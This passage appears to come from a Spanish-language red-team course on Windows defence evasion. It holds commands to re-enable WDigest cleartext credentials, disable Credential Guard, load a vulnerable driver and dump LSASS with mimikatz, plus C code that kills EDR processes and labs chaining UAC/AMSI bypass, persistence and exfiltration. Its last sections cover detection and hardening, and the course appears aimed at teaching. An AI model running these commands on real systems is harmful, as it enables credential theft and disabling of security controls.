        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}

// Redirigir exportaciones:
// Exportar exactamente las mismas funciones que la DLL original
// Cada funcion redirige a la DLL original
```

## 19. [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) Callback Abuse

### 19.1 Abuso de Callbacks de Kernel

```c
// Registrar callback de creacion de proceso
NTSTATUS PsSetCreateProcessNotifyRoutine(NotifyRoutine, TRUE);

// Registrar callback de carga de imagen
NTSTATUS PsSetLoadImageNotifyRoutine(ImageNotifyRoutine);

// Registrar callback de creacion de thread
NTSTATUS PsSetCreateThreadNotifyRoutine(ThreadNotifyRoutine);

// Abuso:
// 1. Registrar callback que monitorea creacion de procesos
// 2. Cuando se crea un proceso de seguridad, terminarlo
// 3. O modificar el token del proceso recien creado

// Ejemplo: terminar EDR al cargarse
VOID ImageLoadCallback(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
    if (wcsstr(FullImageName->Buffer, L"edr_sensor.dll")) {
        // Terminar proceso que cargo el EDR
        ZwTerminateProcess(NtCurrentProcess(), 0);
    }
}
```

## 20. Ejercicios Practicos Avanzados

### 20.1 Laboratorio Integrador

**Escenario:** Simula un ataque completo que debe evadir todos los controles de seguridad:

1. **[recon](../raw/0s1nt.md#reconocimiento)**: Usa LOLBins para recolectar informacion del sistema
2. **[uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass)**: Usa fodhelper para obtener token elevado
3. **[amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass)**: Parchea AmsiScanBuffer en memoria
4. **Defender Evasion**: Crea exclusion para tu [payload](../raw/m3t4spl01t.md#payloads)
5. **Execution**: Usa msbuild.exe para ejecutar codigo .NET
6. **Persistence**: Registra via [com](../raw/w1n-s9bsyst3ms.md#com) hijacking
7. **Exfiltration**: Usa BITS para subir datos

**Ejercicio 20.1:** Implementa DLL proxying para una aplicacion legitima. La DLL [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) debe ejecutar un payload y luego pasar el control a la DLL original.

**Ejercicio 20.2:** Usa WSL para evadir AppLocker. Configura WSL con herramientas de [red](../raw/r3d3s-f0nd4m3nt0s.md) y demostra que no hay restricciones.

**Ejercicio 20.3:** Implementa un [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) callback que detecte cuando se carga un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de seguridad y lo termine.

## 21. Windows Credential Guard Evasion

### 21.1 WDigest y Credential Caching

```powershell
# WDigest almacena credenciales en texto claro en LSASS
# Deshabilitado desde Win8.1 pero se puede reactivar

# Reactivar WDigest:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v Negotiate /t REG_DWORD /d 1 /f
# Requiere reinicio

# Alternativa: forzar a que el usuario provea credenciales
# runas /user:domain\user cmd.exe
# Esto almacena la password en WDigest
```

### 21.2 Credential Guard Bypass

```bash
# Credential Guard usa virtualization-based security (VBS)
# Protege hashes en LSAISO.exe (aislado en VM)

# Bypass methods:
# 1. Deshabilitar Credential Guard via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

# 2. Si no hay VBS, LSASS contiene los hashes directamente
# mimikatz.exe privilege::debug sekurlsa::logonpasswords

# 3. Forzar downgrade de protocolo
# Si el usuario se autentica con NTLMv1, podemos capturar

# 4. SSP (Security Support Provider) injection
# Cargar DLL en LSASS para capturar credenciales
```

## 22. LSA Protection Bypass

### 22.1 LSA Protection

```bash
# LSA Protection (RunAsPPL) protege LSASS de acceso no autorizado
# Solo procesos firmados por Microsoft pueden acceder

# Verificar estado:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

# Bypass methods:
# 1. Driver vulnerable (BYOVD) para deshabilitar proteccion
# 2. Modificar registry (requiere reboot)
# 3. Parchear RunAsPPL en memoria via kernel

# Ejemplo con driver vulnerable:
sc create evil binPath= C:\vulnerable_driver.sys type= kernel
sc start evil
# Ahora podemos acceder a LSASS
```

### 22.2 Defensa contra Credential Theft

```powershell
# Configurar protecciones:
# 1. Habilitar Credential Guard (Win10+ Enterprise)
# 2. Habilitar LSA Protection (RunAsPPL)
# 3. Restringir debug privilege
# 4. Monitorear acceso a LSASS (Sysmon EventID 10)

# Detectar mimikatz:
# - EventID 10 (ProcessAccess) a lsass.exe
# - Debug privilege usage (EventID 4672)
# - Load DLL (EventID 7) de win32u.dll
# - Suspicious process patterns

# Remediation:
secedit /export /cfg secpol.inf
# Modificar: SeDebugPrivilege = *S-1-5-32-544 (solo admins)
```

## 23. Ejercicios Practicos Finales

### 23.1 Laboratorio de Evasion Completo

**Escenario:** Simula un ataque APT que debe evadir todos los controles:

**Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento)**
- Usa LOLBins para enumerar el sistema
- Detecta que controles de seguridad estan activos
- Identifica version de Windows y parches

**Fase 2: Acceso Inicial**
- Usa [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) (fodhelper) para obtener admin
- Bypass [amsi](../raw/3dr-3v4s10n.md#amsi) (patch AmsiScanBuffer)
- Descarga [payload](../raw/m3t4spl01t.md#payloads) (bitsadmin)

**Fase 3: [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)**
- [com](../raw/w1n-s9bsyst3ms.md#com) hijacking en CLSID no utilizado
- [wmi](../raw/w1n-s9bsyst3ms.md#wmi) event subscription persistente
- Service DLL (servicio nuevo con DLL maliciosa)

**Fase 4: Movimiento Lateral**
- pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) con [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz)
- RDP hijack via tscon
- [dcom](../raw/w1n-s9bsyst3ms.md#dcom) lateral movement

**Fase 5: Exfiltracion**
- [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) tunneling para sacar datos
- BITS admin jobs
- Codificar datos en transacciones DNS

### 23.2 Deteccion de las Tecnicas

Para cada tecnica usada, identifica:
1. Que EventID genera en [sysmon](../raw/3dr-3v4s10n.md#sysmon)
2. Que regla de [sigma](../raw/thr3t-hnt.md#sigma) detectaria
3. Que configuracion de Defender/ASR lo bloquea
4. Como mitigarlo permanentemente

### 23.3 Proyecto Final

Desarrolla una presentacion tecnica que incluya:
1. Demostracion de cada tecnica de evasion
2. Explicacion del mecanismo subyacente
3. Metodos de deteccion (logs, [etw](../raw/3dr-3v4s10n.md#etw), Sysmon)
4. Estrategias de mitigacion y hardening
5. Referencias a [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck)

